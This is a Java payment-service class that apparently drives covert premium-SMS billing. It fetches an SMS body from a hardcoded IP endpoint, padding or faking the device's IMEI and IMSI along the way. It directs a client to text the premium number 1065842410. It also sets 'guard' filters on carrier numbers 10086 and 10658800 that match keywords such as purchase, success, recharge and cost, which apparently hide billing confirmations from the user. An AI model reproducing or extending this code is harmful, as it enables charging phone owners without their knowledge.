package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * http://122.114.52.197:8007/mmsdktest.aspx?imei=862949029214504&imsi=460022101441340&channel=3003960275&paycode=30000849835802
 * @author leoliu
 *
 */
public class FyhdMmDynamicService implements IDynamicService{

	private static final String TYPE = "fyhdMm";
	
	private static final String REQUESTMODEL = "imei={imei}&imsi={imsi}&channel={channelcode}&paycode={paycode}";
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065842410";
	
	private static final Guard guard0 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard2 = new Guard("10658800","",960,null,1);
	private static final Guard guard3 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private int timeOut = 60;
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
	
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = REQUESTMODEL.replace("{imsi}" , imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = fillImei(imei.replaceAll("[a-zA-Z]","1"));
			
			
			param = param.replace("{imei}", imei);
			
			String channelcode = map.get("channelcode");
			
			String paycode = map.get("paycode");
			
			param = param.replace("{channelcode}", channelcode).replace("{paycode}", paycode);
			
			String responseTxt = GetData.getData(url,param);
			
			xml = parse(map,responseTxt);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parse(Map<String,String> map,String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 10){
			
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(responseTxt);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard0);
			guardList.add(guard1);
			guardList.add(guard2);
			guardList.add(guard3);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
				
			return XstreamHelper.toXml(smsList);
			
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	public static void main(String[] args){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460022101441340");
		map.put("imei", "862949029214504");
		map.put("channel", "100001a087654321");
		map.put("paycode","30000849835802");
		map.put("channelcode", "3003960275");
		map.put("url","http://122.114.52.197:8007/mmsdktest.aspx");
		map.put("type","fyhdMm");
		
		System.out.println(new FyhdMmDynamicService().dynamic(map));
	}


}
